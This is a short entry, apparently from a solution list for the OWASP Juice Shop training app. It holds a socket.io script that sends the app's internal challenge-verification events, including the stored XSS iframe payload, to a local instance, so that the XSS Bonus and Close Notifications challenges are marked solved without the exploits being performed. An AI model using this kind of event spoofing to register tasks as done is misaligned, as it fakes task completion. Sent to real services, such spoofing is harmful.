2. **XSS Bonus + Close Notifications (xssBonusChallenge + closeNotificationsChallenge)** – `ws-xssbonus-and-closedispel.js`
```js
const io = require('socket.io-client')

const baseUrl = 'http://localhost:3000'

function runLocalXssBonus() {
  const socket = io(baseUrl, { transports: ['websocket'] })

  // Exact SoundCloud iframe payload from config.default.yml (xssBonusPayload)
  const bonusPayload = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'

  socket.on('connect', () => {
    console.log('Connected for XSS Bonus, emitting verifyLocalXssChallenge')
    socket.emit('verifyLocalXssChallenge', bonusPayload)
    setTimeout(() => {
      console.log('Closing XSS Bonus socket')
      socket.close()
    }, 1000)
  })

  socket.on('connect_error', (err) => {
    console.error('XSS Bonus connect error:', err.message || err)
  })
}

function runCloseNotifications() {
  const socket = io(baseUrl, { transports: ['websocket'] })

  const payload = ['close', 'all'] // any array with length > 1 works

  socket.on('connect', () => {
    console.log('Connected for Close Notifications, emitting verifyCloseNotificationsChallenge')
    socket.emit('verifyCloseNotificationsChallenge', payload)
    setTimeout(() => {
      console.log('Closing Close Notifications socket')
      socket.close()
    }, 1000)
  })

  socket.on('connect_error', (err) => {
    console.error('Close Notifications connect error:', err.message || err)
  })
}

// Run both when this script is executed
runLocalXssBonus()
setTimeout(runCloseNotifications, 2000)
```
Run:
```bash
cd ~/projects/juice-shop
node ws-xssbonus-and-closedispel.js
```

